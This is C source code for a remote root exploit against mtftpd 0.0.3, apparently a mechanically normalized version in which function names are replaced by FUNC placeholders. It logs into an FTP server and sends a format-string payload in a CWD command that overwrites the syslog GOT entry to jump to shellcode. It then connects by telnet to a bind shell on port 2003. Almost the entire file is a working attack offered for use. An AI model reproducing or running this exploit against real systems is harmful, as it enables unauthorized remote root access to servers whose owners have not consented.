#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  recva ;
typedef  int /*<<< orphan*/  final ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char EOF ; 
 int GOT_ADDR ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  PORT ; 
 int RETADDR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 char* FUNC0 (unsigned long,unsigned int,unsigned int,int) ; 
 int FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (unsigned char,unsigned char,unsigned char,unsigned char,unsigned long) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,int) ; 
 char FUNC5 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 scalar_t__ FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC13 (int) ; 
 int /*<<< orphan*/  FUNC14 (char*,int,char*,...) ; 
 int FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC17 (char*,char*) ; 
 int FUNC18 (char*) ; 
 scalar_t__ FUNC19 (char*,char*) ; 
 int FUNC20 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC21 (char*) ; 
 int /*<<< orphan*/  FUNC22 (char*) ; 

int
FUNC23( int argc, char * argv[] )
{
  char opt;
  char * fmt;
  char * endian;
  unsigned long locaddr, retaddr;
  unsigned int offset, base, align = 0;
  unsigned char b0, b1, b2, b3;
  int length, ch;
  char *username = NULL;
  char *password = NULL, *ip = NULL;
  char evil[3000];
  int f_got = 0;
  int f_retaddr = 0;
  char databuf[300];
  struct sockaddr_in final;
  int Socket;
  char exec[300];
  char recva[200];

if ( argc < 6 ) { FUNC22(argv[0]); }
	FUNC10("\n\nmtftpd <= 0.0.3 remote root exploit\n");
	FUNC10("by darkeagle [http://unl0ck.org]\n");
while ((opt = FUNC5(argc, argv,"p:u:a:g:r:")) != EOF) {
		switch (opt) {
			case 'p':
				password = optarg;
				break;
			case 'a':
				ip = optarg;
				break;
			case 'g':
				f_got = FUNC20(optarg,NULL,0);
				break;
			case 'r':
				f_retaddr = FUNC20(optarg,NULL,0);
				break;
			case 'u':
				username = optarg;
				break;
			default:
				FUNC22(argv[0]);
				break;
		}
	}

if ( f_got == 0 || f_retaddr == 0 )
{
	f_got = GOT_ADDR;
	f_retaddr = RETADDR;
}

FUNC10("\n [`] GOT: 0x%x\n [`] Retaddr: 0x%x\n [`] Username: %s\n [`] Password: %s\n [`] IP: %s\n [`] Port: %d\n", f_got, f_retaddr, username, password, ip, 21);

FUNC10(" [`] Creating SOCKET structure...\n");

final.sin_family = AF_INET;
final.sin_port = FUNC6(PORT);
final.sin_addr.s_addr = FUNC7(ip);

Socket = FUNC15(AF_INET, SOCK_STREAM, IPPROTO_IP);

FUNC10(" [+] Structure Done!\n");

FUNC10(" [`] Connecting...\t");

if ( FUNC1(Socket, (struct sockaddr*)&final, sizeof(final)) == -1 ) { FUNC10("FAILED!\n"); FUNC3(0); }

FUNC10("OK!\n");

FUNC10(" [+] Sending LOGIN DATA\n");

FUNC14(databuf, 300, "USER %s\r\n\r\nPASS %s\r\n\r\n", username, password);

FUNC12(Socket, databuf, FUNC18(databuf), 0);
FUNC11(Socket, recva, sizeof(recva), 0);

if ( FUNC19(recva, "230" ) ) { FUNC10(" [+] Successfully logged!\n"); } else {
FUNC10(" [-] Invalid login or password!\n\n");
FUNC3(0); }

FUNC10(" [`] Creating EviL Data...\t");
  length = ( sizeof( size_t ) * 16 ) + 1;

  if ( !(endian = (char *)FUNC8(length * sizeof(char))) ) {
    FUNC4( stderr, "Can't allocate buffer (%d)\n", length );
    FUNC3( -1 );
  }
  FUNC9( endian, 0, length );

  ch      = 0;
  locaddr = f_got; // syslog GOT
  retaddr = f_retaddr; // return address to shellcode
  offset  = 12; // offset to 0x2e414141 - CWD AAAA%12$x
  base    = 4;
  //locaddr += 0x4;

  FUNC2( b0, b1, b2, b3, locaddr );

  if ( base%4 ) {
    align = 4 - ( base%4 );
    base += align;
  }

        FUNC17(endian, "U");

	FUNC14( endian+FUNC18(endian), length,
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c",
              b3, b2, b1, b0,
              b3 + 1, b2, b1, b0,
              b3 + 2, b2, b1, b0,
              b3 + 3, b2, b1, b0 );

    fmt = FUNC0( retaddr, offset, base, 0xF + 0x1 );

    FUNC9(fmt+FUNC18(fmt), 0x42, 48);
    FUNC17(fmt, shellcode);
    FUNC16(evil, "CWD %s\r\n\r\n", fmt);

if ( FUNC18(evil) >= 256 ) { FUNC10("FAILED!\n"); FUNC3(0); }

	FUNC10("OK!\n");
	FUNC10(" [`] Sending...\t");
    FUNC12(Socket, evil, FUNC18(evil), 0);
FUNC10("OK!\n");
FUNC16(exec, "telnet %s 2003\n", ip);
FUNC10(" [+] Connecting to shell...\t");
FUNC13(2);
FUNC21(exec);
FUNC10("FAILED!\n\n");
return 0;
}